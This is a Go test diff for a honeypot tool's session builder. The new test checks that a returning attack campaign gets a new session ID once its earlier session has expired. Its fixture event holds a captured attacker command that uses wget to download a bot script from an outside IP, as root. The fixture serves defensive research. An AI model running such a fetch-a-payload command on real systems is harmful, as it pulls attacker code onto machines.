@@ -210,3 +210,29 @@ func TestTTPBuilderConcurrent(t *testing.T) {
 		t.Error("expected active sessions after concurrent updates")
 	}
 }
+
+// A campaign that returns after its session expired must get a new session
+// ID (same campaign fingerprint), so persisting it can't overwrite the
+// earlier, already-flushed session.
+func TestReturningCampaignGetsNewSessionID(t *testing.T) {
+	b := NewTTPBuilder(time.Minute)
+	ev := func(at time.Time) *database.Event {
+		return &database.Event{Timestamp: at, Honeypot: "cowrie", SourceIP: "203.0.113.20",
+			EventType: "command", Command: "wget http://198.51.100.9/bot.sh", Username: "root"}
+	}
+	first, _ := b.Update(ev(time.Now().UTC().Add(-2 * time.Hour)))
+	firstID, firstFP := first.SessionID, first.CampaignFingerprint
+	if got := b.FlushExpired(); len(got) != 1 {
+		t.Fatalf("FlushExpired returned %d sessions, want 1", len(got))
+	}
+	second, isNew := b.Update(ev(time.Now().UTC()))
+	if !isNew {
+		t.Fatal("returning campaign should start a new session")
+	}
+	if second.CampaignFingerprint != firstFP {
+		t.Fatalf("campaign fingerprint changed: %q vs %q", second.CampaignFingerprint, firstFP)
+	}
+	if second.SessionID == firstID {
+		t.Fatalf("new session reused flushed session ID %q", firstID)
+	}
+}
